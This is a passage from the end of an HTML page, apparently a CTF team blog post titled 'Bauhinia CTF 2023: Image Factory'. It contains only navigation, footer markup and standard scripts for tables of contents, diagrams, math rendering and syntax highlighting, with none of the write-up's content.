        <span>Bauhinia Newsletter Volume 1</span>
      </a>
      <a class="next" href="https://b6a.black/posts/2023-08-28-cryptoctf/">
        <span class="title">Next Page »</span>
        <br>
        <span>CryptoCTF 2023 Writeup</span>
      </a>
    </nav>
  </footer>
</article>
<aside class="toc-container">
  <a href="#" style="text-decoration: none; font-weight: 700;">
    Bauhinia CTF 2023: Image Factory
  </a>
  <div class="js-toc"></div>
</aside>

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.12.0/tocbot.min.css" integrity="sha512-SFw7k74K3983tyOlJIHa8atr9Ppef3Kix5cmifwzU7ZdtU2E0FRuOVRtd3ENpMJ8sNCie5hlb/0j23efcdQJXA==" crossorigin="anonymous" />
<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.12.0/tocbot.min.js" integrity="sha512-oD3xGN8YTxenx6tdS4D/RKqO4OtORBQtAb2/FseM17GGMIi6jMwKUBc8duX4A5RwMOGGXoFBZrsqbOk8GpXFgQ==" crossorigin="anonymous"></script>

<script type="text/javascript">
  tocbot.init({
    headingSelector: 'h1, h2, h3, h4',
    orderedList: false,
    headingLabelCallback: s => s.substr(0, s.length-1),
    collapseDepth: 2
  });
</script>
<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/viz.js/1.7.1/viz.js"> </script>
<script type="text/javascript">
  (function () {
    const vizPrefix = "language-viz-";
    Array.prototype.forEach.call(document.querySelectorAll("[class^=" + vizPrefix + "]"), function (x) {
      let engine;
      x.getAttribute("class").split(" ").forEach(function (cls) {
        if (cls.startsWith(vizPrefix)) {
          engine = cls.substr(vizPrefix.length);
        }
      });
      const image = new DOMParser().parseFromString(Viz(x.innerText, { format: "svg", engine: engine }), "image/svg+xml");
      x.parentNode.insertBefore(image.documentElement, x);
      x.style.display = 'none'
      x.parentNode.style.backgroundColor = "white"
    });
  })();
</script>
    </main><footer class="footer">
    <span>&copy; 2025 <a href="https://b6a.black/">Black Bauhinia</a></span>
    <span>&middot;</span>
    <span>Powered by <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a></span>
    <span>&middot;</span>
    <span>Theme <a href="https://git.io/hugopapermod" rel="noopener" target="_blank">PaperMod</a></span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)">
    <button class="top-link" id="top-link" type="button" accesskey="g">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
            <path d="M12 6H0l6-6z" />
        </svg>
    </button>
</a>

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css"
  integrity="sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3+Aro6EYUG4+cU+KJWu/X" crossorigin="anonymous">
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.js"
  integrity="sha384-g7c+Jr9ZivxKLnZTDUhnkOnsh30B4H0rpLUpJ4jAIKs4fnJI+sEnkvrMWph2EDg4" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/contrib/auto-render.min.js"
  integrity="sha384-mll67QQFJfxn0IYznZYonOWZ644AWYC+Pt2cHqMaRhXVrursRwvLnLaebdGIlYNa" crossorigin="anonymous"
  onload="renderMathInElement(document.body, { delimiters: [{ left: '$$', right: '$$', display: true }, { left: '\\[', right: '\\]', display: true }, { left: '$', right: '$', display: false }, { left: '\\(', right: '\\)', display: false }]})"></script>

<script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script>
<script>
mermaid.initialize({
    startOnLoad: true,
    htmlLabels: true,
    securityLevel: "loose",
    theme: 'base',
    themeVariables: {
        background: '#22222c',
        primaryColor: '#33333c',
        primaryTextColor: '#ffe4e1',
    }
});
</script>



<script defer src="/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js" integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5&#43;kdJvBz5iKbt6B5PJI="
    onload="hljs.initHighlightingOnLoad();"></script>
<script>
    window.onload = function () {
        if (localStorage.getItem("menu-scroll-position")) {
            document.getElementById('menu').scrollLeft = localStorage.getItem("menu-scroll-position");
        }
    }
    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

    function menu_on_scroll() {
        localStorage.setItem("menu-scroll-position", document.getElementById('menu').scrollLeft);
    }

</script>

</body>

</html>
